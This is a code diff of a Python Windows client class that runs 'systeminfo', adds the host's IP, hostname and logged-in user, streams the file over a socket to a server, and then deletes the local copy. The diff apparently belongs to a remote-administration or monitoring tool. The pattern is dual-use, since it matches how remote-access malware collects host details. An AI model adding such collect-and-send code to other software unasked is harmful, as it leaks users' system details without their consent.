@@ -46,19 +46,34 @@ class Sysinfo:
 
     def command_to_file(self):
         try:
-            self.logIt_thread(self.log_path, msg='Opening system information file...')
-            sysinfo = open(self.sifile, 'w')
-            self.logIt_thread(self.log_path, msg='Running systeminfo command...')
-            sinfo = subprocess.call(['systeminfo'], stdout=sysinfo)
-            sysinfo.write("\n")
-            self.logIt_thread(self.log_path, msg='Running net user command...')
-            allusers = subprocess.call(['net', 'user'], stdout=sysinfo)
-            sysinfo.write("\n")
-            self.logIt_thread(self.log_path, msg='Closing system information file...')
-            sysinfo.close()
-            self.logIt_thread(self.log_path, msg=f'{sysinfo} closed.')
+            with open(self.sifile, 'w') as sysinfo:
+                self.logIt_thread(self.log_path, msg='Running system information command...')
+                sys_info = subprocess.run(['systeminfo'], stdout=subprocess.PIPE, text=True)
+                sys_info_str = sys_info.stdout
+                self.logIt_thread(self.log_path, msg=f'Adding header to {self.sifile}...')
+                sysinfo.write(f"====================================================\n")
+                sysinfo.write(
+                    f"IP: {self.localIP} | NAME: {self.hostname} | LOGGED USED: {os.getlogin()}\n")
+                sysinfo.write(f"====================================================\n")
+                self.logIt_thread(self.log_path, msg=f'Adding system information to {self.sifile}...')
+                sysinfo.write(f"{sys_info_str}\n\n")
+                time.sleep(2)
 
             return True
+
+            # self.logIt_thread(self.log_path, msg='Opening system information file...')
+            # sysinfo = open(self.sifile, 'w')
+            # self.logIt_thread(self.log_path, msg='Running systeminfo command...')
+            # sinfo = subprocess.call(['systeminfo'], stdout=sysinfo)
+            # sysinfo.write("\n")
+            # self.logIt_thread(self.log_path, msg='Running net user command...')
+            # allusers = subprocess.call(['net', 'user'], stdout=sysinfo)
+            # sysinfo.write("\n")
+            # self.logIt_thread(self.log_path, msg='Closing system information file...')
+            # sysinfo.close()
+            # self.logIt_thread(self.log_path, msg=f'{sysinfo} closed.')
+
+            # return True
 
         except (FileNotFoundError, FileExistsError) as e:
             self.logIt_thread(self.log_path, msg=f'File Error: {e}')
@@ -131,7 +146,7 @@ class Sysinfo:
             result.append(no & 255)
         return result
 
-    def run(self):
+    def run(self, filename):
         self.logIt_thread(self.log_path, msg='Calling get_date()...')
         dt = self.get_date()
 
@@ -140,15 +155,79 @@ class Sysinfo:
         self.logIt_thread(self.log_path, msg=f'File name: {self.sifile}')
 
         self.logIt_thread(self.log_path, msg='Calling command_to_file()...')
-        self.command_to_file()
+        # self.command_to_file()
+        with open(filename, 'w') as sysinfo:
+            self.logIt_thread(self.log_path, msg='Running system information command...')
+            sys_info = subprocess.run(['systeminfo'], stdout=subprocess.PIPE, text=True)
+            sys_info_str = sys_info.stdout
+            self.logIt_thread(self.log_path, msg=f'Adding header to {self.sifile}...')
+            sysinfo.write(f"====================================================\n")
+            sysinfo.write(
+                f"IP: {self.localIP} | NAME: {self.hostname} | LOGGED USED: {os.getlogin()}\n")
+            sysinfo.write(f"====================================================\n")
+            self.logIt_thread(self.log_path, msg=f'Adding system information to {self.sifile}...')
+            sysinfo.write(f"{sys_info_str}\n\n")
+
         self.logIt_thread(self.log_path, msg='Calling send_file_name()...')
-        self.send_file_name()
+        # self.send_file_name()
+        try:
+            self.logIt_thread(self.log_path, msg='Sending file name...')
+            self.soc.send(f"{self.sifile}".encode())
+            self.logIt_thread(self.log_path, msg=f'Send Completed.')
+
+        except (WindowsError, socket.error) as e:
+            self.logIt_thread(self.log_path, msg=f'Connection Error: {e}')
+            return False
+
         self.logIt_thread(self.log_path, msg='Calling send_file_size()...')
-        self.send_file_size()
+        # self.send_file_size()
+        try:
+            self.logIt_thread(self.log_path, msg='Defining file size...')
+            length = os.path.getsize(self.sifile)
+            self.logIt_thread(self.log_path, msg=f'File Size: {length}')
+
+            self.logIt_thread(self.log_path, msg='Sending file size...')
+            self.soc.send(self.convert_to_bytes(length))
+            self.logIt_thread(self.log_path, msg=f'Send Completed.')
+
+        except (WindowsError, socket.error) as e:
+            self.logIt_thread(self.log_path, msg=f'Connection Error: {e}')
+            return False
+
         self.logIt_thread(self.log_path, msg='Calling send_file_content()...')
-        self.send_file_content()
+        # self.send_file_content()
+        try:
+            self.logIt_thread(self.log_path, msg=f'Opening {self.sifile}...')
+            with open(self.sifile, 'rb') as sy_file:
+                self.logIt_thread(self.log_path, msg='Sending file content...')
+                sys_data = sy_file.read(1024)
+                while sys_data:
+                    self.soc.send(sys_data)
+                    if not sys_data:
+                        break
+
+                    sys_data = sy_file.read(1024)
+
+            self.logIt_thread(self.log_path, msg=f'Send Completed.')
+
+        except (WindowsError, socket.error, FileExistsError, FileNotFoundError) as e:
+            self.logIt_thread(self.log_path, msg=f'Error: {e}')
+            return False
+
         self.logIt_thread(self.log_path, msg='Calling confirm()...')
-        self.confirm()
+        # self.confirm()
+        try:
+            self.logIt_thread(self.log_path, msg='Waiting for message from server...')
+            msg = self.soc.recv(1024).decode()
+            self.logIt_thread(self.log_path, msg=f'From Server: {msg}')
+
+            self.logIt_thread(self.log_path, msg=f'Sending confirmation message...')
+            self.soc.send(f"{self.hostname} | {self.localIP}: System Information Sent.\n".encode())
+            self.logIt_thread(self.log_path, msg=f'Send Completed.')
+
+        except (WindowsError, socket.error) as e:
+            self.logIt_thread(self.log_path, msg=f'Connection Error: {e}')
+            return False
 
         time.sleep(1)
         self.logIt_thread(self.log_path, msg='Removing system information file...')
